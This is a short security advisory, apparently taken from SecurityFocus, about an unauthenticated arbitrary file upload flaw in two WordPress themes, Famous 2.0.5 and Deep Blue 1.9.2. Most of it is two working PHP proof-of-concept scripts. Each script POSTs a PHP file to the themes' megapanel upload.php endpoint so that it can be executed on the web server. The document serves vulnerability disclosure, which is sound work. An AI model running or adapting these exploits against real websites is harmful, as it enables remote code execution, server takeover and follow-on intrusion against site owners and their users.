source: https://www.securityfocus.com/bid/54052/info

Multiple Themes for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

WordPress Famous theme 2.0.5 and WordPress Deep Blue theme 1.9.2 are vulnerable.

<?php

$uploadfile="lo.php";

$ch = curl_init("http://www.example.com/wordpress/wp-content/themes/deep-blue/megaframe/megapanel/inc/upload.php?folder=/wordpress/wp-content/themes/deep-blue/megaframe/megapanel/inc/&fileext=php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

<?php

$uploadfile="lo.php";

$ch = curl_init("http://www.example.com/wordpress/wp-content/themes/famous/megaframe/megapanel/inc/upload.php?folder=/wordpress/wp-content/themes/famous/megaframe/megapanel/inc/&;fileext=php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>